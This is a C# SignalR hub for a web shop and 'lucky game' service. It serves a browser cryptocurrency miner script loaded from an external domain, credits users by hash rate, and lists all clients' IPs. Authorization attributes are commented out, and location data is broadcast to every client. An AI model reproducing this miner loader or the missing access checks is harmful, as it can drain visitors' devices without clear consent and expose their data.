using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.SignalR;
using Microsoft.AspNet.SignalR.Transports;
using SignalRService.Interfaces;
using SignalRService.Localization;
using SignalRService.Utils;

namespace SignalRService.Hubs
{
    public class ServiceHub : Hub
    {
        private DAL.ServiceContext db = new DAL.ServiceContext();
        private Repositories.OrderRepository orderRepository;
        private Repositories.ProductRepository productRepository;
        private Repositories.UserRepository userRepository;
        private Repositories.GameSettingsRepository gameSettingsRepository;
        private Repositories.ServiceSettingRepositorie serviceSettingsRepository;

        public ServiceHub()
        {
            orderRepository = new Repositories.OrderRepository(db);
            productRepository = new Repositories.ProductRepository(db);
            userRepository = new Repositories.UserRepository(db);
            gameSettingsRepository = new Repositories.GameSettingsRepository(db);
            serviceSettingsRepository = new Repositories.ServiceSettingRepositorie(db);
        }

        private void  addConnection(string refererUrl, string remoteIP)
        {
            if (Context.Request.User.Identity.IsAuthenticated)
            {
                db.AddConnection(Context.ConnectionId, refererUrl, remoteIP, Context.Request.User.Identity.Name);

            }
            else
            {
                db.AddConnection(Context.ConnectionId, refererUrl, remoteIP);
            }

        }

        public override Task OnConnected()
        {
            Utils.SignalRServiceUtils.RemoveDeadConnections();
            addConnection(Context.Request.GetRefererUrl(), Context.Request.GetClientIp() );
            return base.OnConnected();
        }

        public override Task OnDisconnected(bool stopCalled)
        {
            db.RemoveConnection(Context.ConnectionId);
            return base.OnDisconnected(stopCalled);
        }

        public override Task OnReconnected()
        {
            if (!db.SignalRConnections.Any(ln => ln.SignalRConnectionId == Context.ConnectionId))
            {
                addConnection(Context.Request.GetRefererUrl(), Context.Request.GetClientIp());
            }
            else
            {
                db.UpdateConnectionState(Context.ConnectionId, Enums.EnumSignalRConnectionState.Connected);
            }
            return base.OnReconnected();
        }


        public Task JoinGroup(string name)
        {
            return Groups.Add(Context.ConnectionId, name.ToLower());
        }

        public Task LeaveGroup(string groupName)
        {
            return Groups.Remove(Context.ConnectionId, groupName);
        }

        public void AddToCart(string itemId, string group)
        {
            //notify all other clients
            //Task.Run(() => GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.Group(group.ToLower(), Context.ConnectionId).someoneAddedItemToCart(itemId));
            Task.Run(() => GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.All.someoneAddedItemToCart(itemId));

        }

        /// <summary>
        /// clientrequest for loading products
        /// </summary>
        /// <returns></returns>
        public List<ViewModels.ProductViewModel> getProducts(string group, SearchConfig config)
        {
            List<ViewModels.ProductViewModel> reslist = new List<ViewModels.ProductViewModel>();
            var user = userRepository.GetUser(Context.Request.User.Identity.Name);
            var dbService = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == group);
            if (dbService == null)
                return reslist;

            if (config.SearchTerms.Length == 0)
            {
                foreach (var item in db.Products
                        .Where(ln => ln.Owner.ID == dbService.Owner.ID)
                        .OrderBy(ln => ln.Name).Take(10))
                {
                    reslist.Add(item.ToProductViewModel());
                }
                return reslist;
            }

            var searchResItems = Utils.LuceneUtils.Search(config.SearchTerms,user.Id);


          

            foreach (var item in searchResItems)
            {
                //if(item.Owner.ID == dbService.Owner.ID)
                    reslist.Add(item.ToProductViewModel());
            }

            return reslist;
        }

     //   [Authorize]
        public List<ViewModels.OrderViewModel> getOrders(Enums.EnumGuiType guiType, string group, FilterSortConfig config)
        {
            var dbService = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == group);
            if (dbService == null)
                return new List<ViewModels.OrderViewModel>();

            var user = userRepository.GetUserFromSignalR(Context.ConnectionId);

            var allorders = orderRepository.GetOrders(user.Id, guiType);
            var sortedorders = Utils.OrderUtils.SortByConfig(allorders, config.Sorters); 

            return sortedorders;
        }

        private ViewModels.ProductViewModel _stageProduct(ProductData data, string group, string connectionId)
        {
            ViewModels.ProductViewModel resVm = new ViewModels.ProductViewModel();
            int dangerIdx = 0;
            if(string.IsNullOrEmpty(group))
            {
                resVm.ErrorMessage = "stageProduct - no groupname given....";
                resVm.ErrorNumber = 7710;
                return resVm;
            }

            if( Utils.ValidationUtils.IsDangerousString(group, out dangerIdx) )
            {
                resVm.ErrorMessage = "invalid groupname given....";
                resVm.ErrorNumber = 7710;
                return resVm;
            }

            List<string> vmessages = new List<string>();
            if (Utils.ProductUtils.IsValidProductData(data, out vmessages))
            {
                var newProduct = productRepository.ProductAddOrUpdate(new ViewModels.ProductViewModel()
                {
                    Name = data.Name,
                    Description = data.Description,
                    Owner = userRepository.GetUserFromSignalR(connectionId),
                    Price = data.Price,
                    PartNumber = data.PartNumber
                });
                
                GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.Group(group).productStaged(newProduct.ToProductViewModel());
                resVm.Identifier = newProduct.ProductIdentifier;
                resVm.Name = newProduct.Name;
                resVm.Owner = newProduct.Owner.ToUserDataViewModel();
                resVm.Price = newProduct.Price;
            }
            resVm.ErrorMessage = vmessages.FirstOrDefault();;
            return resVm;
        }

      //  [Authorize]
        public async Task<ViewModels.ProductViewModel> StageProduct(ProductData data, string group)
        {
            return await Task.Run(() => _stageProduct(data,group, Context.ConnectionId));
        }

    //    [Authorize]
        public void RemoveProduct(string id, string group)
        {
            if (Context.User.IsInRole("Admin"))
            {
                if(productRepository.RemoveProduct(id))
                {
                    GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.Group(group).productRemove(id);
                }
            }
            else
            {
                
                var user = userRepository.GetUserFromSignalR(Context.ConnectionId);
                if (productRepository.IsOwner(id,user.Id))
                {
                    if(productRepository.RemoveProduct(id))
                    {
                        GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.Group(group).productRemove(id);
                    }
                    else
                    {
                        //todo: change returntype return object indicating state.
                    }

                }
                else
                {
                    //todo: change returntype return object indicating state.
                }
            }
            db.SaveChanges();
        }

       
        private ViewModels.OrderViewModel _processOrderRequest(OrderDataDTO orderDTO, string group)
        {
            IOrderProcess orderProcessFactory = null;
            if (Utils.ValidationUtils.IsDangerousString(orderDTO.OrderIdentifier, out int badidx))
                return new ViewModels.OrderViewModel() { ErrorMessage = "Invalid orderIdentifier" };
            
            var orderViewModel = orderRepository.GetOrder(orderDTO.OrderIdentifier);

            var service = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == group);
            if(service == null)
                return new ViewModels.OrderViewModel() { ErrorMessage = "could not get service..." };


            orderProcessFactory = Factories.OrderProcessFactory.GetOrderProcessImplementation(service.ServiceType);
            
            if (orderViewModel == null)
            {
                if(orderDTO.Items.Count == 0)
                    return new ViewModels.OrderViewModel() { ErrorMessage = BaseResource.Get("NoItemsForOrder") };

                orderViewModel = orderProcessFactory.CheckOrder(orderDTO);
                if (!string.IsNullOrEmpty(orderViewModel.ErrorMessage))
                {
                    return orderViewModel;
                }

                var orderItems = orderRepository.CheckProducts(orderDTO.Items);
                var productOwnerId = orderItems.FirstOrDefault().OwnerId; // --!
                var storeUser = userRepository.GetUser(productOwnerId);
                var customerUser = userRepository.GetUserFromSignalR(Context.ConnectionId);
              
                if(storeUser == null || customerUser == null || productOwnerId == -1 || orderItems.Count == 0)
                {
                    return new ViewModels.OrderViewModel()
                    {
                        ErrorMessage = "Invalid Order-Data...",
                    };
                }

                orderViewModel.Items = orderItems;
                orderViewModel.CustomerUser = customerUser;
                orderViewModel.StoreUser = storeUser;
            }

            bool isStoreUser = false;
            if (Context.User.Identity.Name == orderViewModel.StoreUser.Name)
                isStoreUser = true;

                orderProcessFactory = Factories.OrderProcessFactory.GetOrderProcessImplementation(Enums.EnumServiceType.OrderService);
                var orderVMResult = orderProcessFactory.ProcessOrder(orderViewModel, isStoreUser);
                orderViewModel = orderVMResult;
           
            return orderViewModel;
        }


    //    [Authorize]
        public async Task<ViewModels.OrderViewModel> ProcessOrder(OrderDataDTO data, string group)
        {
             return await Task.Run(() => _processOrderRequest(data, group));
        }

        public async Task BroadCastLocation(double lat, double lon)
        {
            ViewModels.LocationViewModel loc = new ViewModels.LocationViewModel()
            {
                Lat = lat,
                Lon = lon,
                ConnectionId = Context.ConnectionId
            };
            GlobalHost.ConnectionManager.GetHubContext<ServiceHub>().Clients.All.updatePosition(loc);
        }

        public async Task<List<Utils.LuckyGameCard>> getLuckyGameCards()
        {
            return await Task.Run(() => _getLuckyGameCards());
        }

        private List<Utils.LuckyGameCard> _getLuckyGameCards()
        {
            return Utils.LuckyGameUtils.GetCards();
        }

        public async Task<double> getMoneyRoomTotal(string group)
        {
            return await Task.Run(() => _getMoneyRoomTotal(group));
        }

        private double _getMoneyRoomTotal(string group)
        {
            var lgs = db.LuckyGameSettings.FirstOrDefault(ln => ln.ServiceSettings.ServiceUrl == group);
            if (lgs != null)
                return lgs.MoneyAvailable;

            return 0;
        }

        public async Task<double> getMoneyUserTotal()
        {
            return await Task.Run(() => _getMoneyUserTotal(Context.ConnectionId));
        }

        private double _getMoneyUserTotal(string connectionId)
        {
            var user = userRepository.GetUserFromSignalR(connectionId);
            return userRepository.GetUserTotalMoney(user.Id);
        }

        public async Task<List<ViewModels.LuckyGameWinningRuleViewModel>> getLuckyGameWinningRules(string group)
        {
            return await Task.Run(() => _getLuckyGameWinningRules(group));
        }

        public List<ViewModels.LuckyGameWinningRuleViewModel> _getLuckyGameWinningRules(string group)
        {
            List<ViewModels.LuckyGameWinningRuleViewModel> res = new List<ViewModels.LuckyGameWinningRuleViewModel>();
            var gs = db.LuckyGameSettings.FirstOrDefault(x => x.ServiceSettings.ServiceUrl == group);
            res.AddRange(gs.WinningRules.ToList().ToWinningRuleViewModels());
            return res;
        }

        public async Task<LuckyGameResponse> addOrUpdateLuckyGameWinningRule(ViewModels.LuckyGameWinningRuleViewModel rule, string group)
        {
            return await Task.Run(() => _addOrUpdateLuckyGameWinningRule(rule, group));
        }

        private LuckyGameResponse _addOrUpdateLuckyGameWinningRule(ViewModels.LuckyGameWinningRuleViewModel rule, string group)
        {
            LuckyGameResponse response = new LuckyGameResponse();
            
            if (rule.AmountMatchingCards < 1)
            {
                return new LuckyGameResponse() {
                    Success = false,
                    ErrorMessage = "AmountMatchingCards must be > 1"
                };
            }

            if(rule.WinFactor < 1)
            {
                return new LuckyGameResponse()
                {
                    Success = false,
                    ErrorMessage = "WinFactor must be > 1"
                };
            }

            var ownerId = gameSettingsRepository.GetOwnerIdForGroup(group);
            var user = userRepository.GetUserFromSignalR(Context.ConnectionId);
            if (ownerId == user.Id)
            {

                return new LuckyGameResponse()
                {
                     Success = true,
                     ResponseData = gameSettingsRepository.AddOrUpdateWinningRule(rule, group)
                };
                  
            }
            else
            {
                return new LuckyGameResponse()
                {
                    Success = false,
                    ErrorMessage = "Not allowed to do this.."
                };
            }
            
        }

        public async Task<LuckyGameResponse> removeLuckyGameWinningRule(int ruleId, string group)
        {
            return await Task.Run(() => _removeLuckyGameWinningRule(ruleId, group));
        }

        private LuckyGameResponse _removeLuckyGameWinningRule(int ruleId, string group)
        {
            var ownerId = gameSettingsRepository.GetOwnerIdForGroup(group);
            var user = userRepository.GetUserFromSignalR(Context.ConnectionId);
            if (ownerId == user.Id)
            {
                if(gameSettingsRepository.RemoveWinningRule(ruleId, group))
                {
                    return new LuckyGameResponse()
                    {
                        ResponseData = true,
                        Success = true
                    };
                }
                else
                {
                    return new LuckyGameResponse()
                    {
                        Success = false,
                        ErrorMessage = "Error removing rule"
                    };
                }
            }

            return new LuckyGameResponse()
            {
                Success = false,
                ErrorMessage = "not allowed todo this.."
            };
        }

        public async Task<Utils.LuckyGameCardResult> getLuckyGameResult(int slotCount, string group, double amount)
        {
            return await Task.Run(() => getLuckyGameResultFor(slotCount, group, amount));
        }

        private Utils.LuckyGameCardResult getLuckyGameResultFor(int slotCount, string group, double amount)
        {
            var res = new Utils.LuckyGameCardResult();
            res.Cards = new List<Utils.LuckyGameCard>();

            if(amount < 1)
            {
                res.ErrorNumber = 667;
                res.Message = BaseResource.Get("AmountToLow");
            }

            var user = userRepository.GetUserFromSignalR(Context.ConnectionId);
            var userTotal = userRepository.GetUserTotalMoney(user.Id);

            if(userTotal < amount)
            {
                res.ErrorNumber = 666;
                res.Message = BaseResource.Get("NotEnoughMoney");
                return res;
            }

          
            List<Utils.LuckyGameCard> reslist = new List<Utils.LuckyGameCard>();
            for(int i = 0; i < slotCount; i++)
            {
                reslist.Add(Utils.LuckyGameUtils.GetRandomCard());
            }

            var groups = reslist.OrderBy(x => x.Key).GroupBy(x => x.Key);
            

            var service = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == group);
            if(service != null)
            {
                var gameSettings = service.LuckyGameSettings.FirstOrDefault();
                if(gameSettings != null)
                {
                    float winFactor = 0;
                    foreach (var gitem in groups)
                    {
                        var matches = gitem.Count();
                        var rule = gameSettings.WinningRules.FirstOrDefault(ln => ln.AmountMatchingCards == matches);
                        if (rule != null)
                        {
                            if (rule.WinFactor > winFactor)
                                winFactor = rule.WinFactor;
                        }
                    }
                    if(winFactor == 0)
                    {
                        //lost
                        res.AmountLost = amount;
                        res.UserTotalAmount = userRepository.WithdrawMoneyFromUser(user.Id,amount);
                        res.TotalAmountAvailable = gameSettingsRepository.AddMoneyToGame(amount, group);
                    }
                    else
                    {
                        //won
                        res.WinFactor = winFactor;
                        res.AmountWon = amount * winFactor;
                        res.TotalAmountAvailable = gameSettingsRepository.WidthdrawMoneyFromGame(amount, group);
                        res.UserTotalAmount = userRepository.DepositMoneyToUser(user.Id, amount);
                    }
                    
                }
                else
                {
                    res.ErrorNumber = 231;
                    res.Message = "No gameSettings...";
                }
            }

            res.Cards = reslist;
           
            return res;
        }

        public void MinerReportStatus(MinerStatusData data)
        {
            db.UpdateMinerState(data, Context.ConnectionId, Context.Request.GetRefererUrl(), Context.Request.GetClientIp());
            if (data.running && data.hps > 0)
            {
                var user = userRepository.GetUserFromSignalR(Context.ConnectionId);
                var newtotal = userRepository.DepositMoneyToUser(user.Id, data.hps);
            }
        }

        public async Task<WorkData> ClientRequestWork()
        {
            //default, in case nothin in db - and for delay / statusinterval which are not in db for now
            var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
            {
                ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                Throttle = "0.9",
                ScriptUrl = "https://www.freecontent.date./W7KS.js",
                StartDelayMs = 3000,
                ReportStatusIntervalMs = 65000
            };

            var dbMinerConfig = db.MinerConfiurationModels.FirstOrDefault();
            if(dbMinerConfig == null)
            {
                SimpleLogger logger = new SimpleLogger();
                logger.Error("No minerconfig in db!");
            }
            else
            {
                MinerConfigurationViewModel.ClientId = dbMinerConfig.ClientId;
                MinerConfigurationViewModel.Throttle = dbMinerConfig.Throttle.ToString();
                MinerConfigurationViewModel.ScriptUrl = dbMinerConfig.ScriptUrl;
            }
           
            var data = Utils.RenderUtils.RenderMinerScript(MinerConfigurationViewModel.ClientId, MinerConfigurationViewModel.Throttle, MinerConfigurationViewModel.ScriptUrl, MinerConfigurationViewModel.StartDelayMs, MinerConfigurationViewModel.ReportStatusIntervalMs);
            //Utils.SignalRServiceUtils.SendScriptDataToClient(Context.ConnectionId,data);
            WorkData wd = new WorkData();
            wd.Script = data.ToString();
            return wd;
        }

        public async Task<MinerList> GetMinerlistInitialState()
        {

            MinerList mlist = new MinerList();
            mlist.Miners = new List<MinerData>();
            foreach(var sitem in db.SignalRConnections.ToList())
            {
                var item = sitem.MinerStatus;
                if (item != null)
                {
                    mlist.Miners.Add(new MinerData()
                    {
                        Id = item.ID,
                        ClientIp = item.SignalRConnection.RemoteIp,
                        ConnectionId = item.SignalRConnection.SignalRConnectionId,
                        Hps = item.Hps,
                        IsMobile = item.OnMobile,
                        IsRunning = item.Running,
                        Throttle = item.Throttle
                    });
                }
            }
            return mlist;
        }

    }

    public class MinerList
    {
        public List<MinerData>Miners { get; set; }
    }

    public class MinerData
    {
        public int Id { get; set; }
        public string ConnectionId { get; set; }
        public string ClientIp { get; set; }
        public float Hps { get; set; }
        public bool IsRunning { get; set; }
        public bool IsMobile { get; set; }
        public float Throttle { get; set; }
    }

    public class WorkData
    {
        public String Script { get; set; }
    }

    public class ClientCallbackData
    {
        public string Method { get; set; }
        public object Parameters { get; set; }
    }

    public class ProductData
    {
        public string Id { get; set; }
        public string Name { get; set; }
        public string Description { get; set; }
        public decimal Price { get; set; }
        public string PartNumber { get; set; }
    }

    public class OrderDataDTO
    {
        public List<OrderItem>Items { get; set; }
        public string OrderIdentifier { get; set; }
    }

    public class OrderItem
    {
        public string ItemId { get; set; }
        public int Amount { get; set; }
    }

    public class MinerStatusData
    {
        public bool running { get; set; }
        public bool onMobile { get; set; }
        public bool wasmEnabled { get; set; }
        public bool isAutoThreads { get; set; }
        public float hps { get; set; }
        public int threads { get; set; }
        public float throttle { get; set; }
        public int hashes { get; set; }

    }

    public class SearchConfig
    {
        public string SearchTerms { get; set; }
        public int StartIndex { get; set; }
        public int PageSize { get; set; }
        public string Sorting { get; set; }
    }

    public class FilterSortConfig
    {
        public List<UiFilter> Filters { get;  set; }
        public List<UiSorter> Sorters { get; set; }
    }

    public class UiFilter
    {
        public string Field { get; set; }
        public string Expression { get; set; }
    }

    public class UiSorter
    {
        public string Expression { get; set; }
    }

}